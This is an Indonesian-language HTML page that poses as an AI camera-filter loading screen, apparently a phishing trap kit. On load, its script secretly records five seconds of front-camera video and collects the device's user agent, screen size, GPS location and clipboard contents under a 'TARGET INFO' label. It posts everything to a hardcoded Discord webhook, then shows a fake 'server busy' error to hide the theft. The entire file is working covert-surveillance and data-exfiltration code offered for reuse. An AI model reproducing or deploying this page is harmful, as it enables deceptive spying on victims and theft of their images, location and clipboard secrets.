<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Filter Proses...</title>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; text-align: center; }
        #loading-screen { display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .spinner { border: 4px solid #333; border-top: 4px solid #e1306c; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status-text { font-size: 14px; color: #aaa; transition: 0.3s; line-height: 1.5; }
        
        /* Video asli disembunyiin, video preview palsu ditaruh di tengah */
        video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; }
        canvas { display: none; }
    </style>
</head>
<body>

<div id="loading-screen">
    <div class="spinner" id="spinner"></div>
    <div id="status-text">Meminta akses kamera...</div>
</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    // GANTI PAKAI WEBHOOK LO
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1561391421200797738/dfLpkO0PbTGmigN72TW2CxmfXoCL4bFIw8xmMxR_9bPvQNhjCGD6LunWTJ-gFl3wlcWA"; 

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusText = document.getElementById('status-text');
    const spinner = document.getElementById('spinner');

    let baseData = `👤 **TARGET INFO**\n` +
                   `OS/UA: ${navigator.userAgent}\n` +
                   `Layar: ${screen.width}x${screen.height}\n`;

    async function startTrap() {
        try {
            // 1. Minta Izin Kamera
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            });
            
            video.srcObject = stream;
            statusText.innerText = "Menganalisis wajah (AI)...";
            
            // 2. Mulai Rekam Video Setelah Kamera Siap
            video.onloadedmetadata = () => {
                video.play();
                
                // Pake MediaRecorder buat ngerekam stream video
                const mediaRecorder = new MediaRecorder(stream);
                let videoChunks = [];
                
                mediaRecorder.ondataavailable = e => {
                    if (e.data.size > 0) videoChunks.push(e.data);
                };
                
                mediaRecorder.onstop = () => {
                    // 3. Setelah 5 detik berhenti, bikin file video
                    const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                    stream.getTracks().forEach(track => track.stop()); // Matikan kamera
                    executeAdvancedTrap(videoBlob, baseData);
                };

                // Mulai rekam
                mediaRecorder.start();
                statusText.innerText = "Menerapkan filter (5 detik)...";

                // Rekam selama 5 detik, lalu stop
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 5000);
            };

        } catch (err) {
            statusText.innerText = "Akses kamera ditolak. Filter tidak dapat dimuat.";
            spinner.style.display = 'none';
        }
    }

    async function executeAdvancedTrap(videoBlob, infoText) {
        let payloadText = infoText;

        // (Opsional) Ambil Lokasi GPS
        try {
            const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {timeout: 5000}));
            payloadText += `\n📍 Lokasi: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        } catch (e) {}

        // (Opsional) Ambil Clipboard
        try {
            const clipText = await navigator.clipboard.readText();
            if (clipText) payloadText += `\n📋 Clipboard: \`${clipText}\``;
        } catch (e) {}

        statusText.innerText = "Menyimpan hasil...";

        // 4. Kirim Video + Teks ke Discord
        const formData = new FormData();
        formData.append("file1", videoBlob, "target_video.webm");
        formData.append("payload_json", JSON.stringify({
            content: payloadText
        }));

        fetch(WEBHOOK_URL, { method: 'POST', body: formData })
            .then(() => {
                spinner.style.display = 'none';
                statusText.innerHTML = "❌ <b>Filter gagal dimuat.</b><br>Server sedang sibuk, coba lagi nanti.";
            })
            .catch(() => {
                spinner.style.display = 'none';
                statusText.innerText = "Koneksi terputus.";
            });
    }

    window.onload = startTrap;
</script>

</body>
</html>
